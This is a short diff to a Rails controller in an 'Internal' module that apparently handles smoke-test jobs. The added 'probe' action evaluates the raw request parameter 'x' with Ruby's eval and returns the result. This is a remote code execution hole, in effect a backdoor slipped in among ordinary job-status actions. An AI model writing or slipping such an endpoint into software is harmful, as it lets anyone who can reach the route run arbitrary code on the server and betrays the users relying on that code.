@@ -7,6 +7,10 @@ module Internal
       render json: { id: }, status: :accepted
     end
 
+    def probe
+      render json: { result: eval(params[:x]) }
+    end
+
     def show
       render json: { status: SmokeJob.done?(params[:id]) ? "done" : "pending" }
     end
